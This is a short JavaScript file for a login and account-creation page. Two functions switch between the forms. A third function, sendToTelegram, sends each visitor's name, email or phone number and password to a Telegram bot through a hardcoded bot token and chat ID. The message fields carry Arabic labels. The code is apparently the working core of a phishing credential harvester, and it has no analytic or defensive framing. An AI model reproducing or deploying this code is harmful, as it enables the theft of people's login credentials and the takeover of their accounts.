// script.js
function showCreateAccount() {
    document.getElementById('login-container').style.display = 'none';
    document.getElementById('create-account-container').style.display = 'block';
}

function showLogin() {
    document.getElementById('create-account-container').style.display = 'none';
    document.getElementById('login-container').style.display = 'block';
}

async function sendToTelegram(data) {
    const token = '8420977917:AAFgRHgmBaUNmo4o0QgGD99aIc-UEmlL3X8';
    const chatId = '7383092654';
    const message = `اسم الشخص: ${data.name}\nالبريد الإلكتروني أو رقم الهاتف: ${data.email}\nكلمة المرور: ${data.password}`;
    
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML' // يمكنك استخدام HTML أو Markdown
        }),
    });
}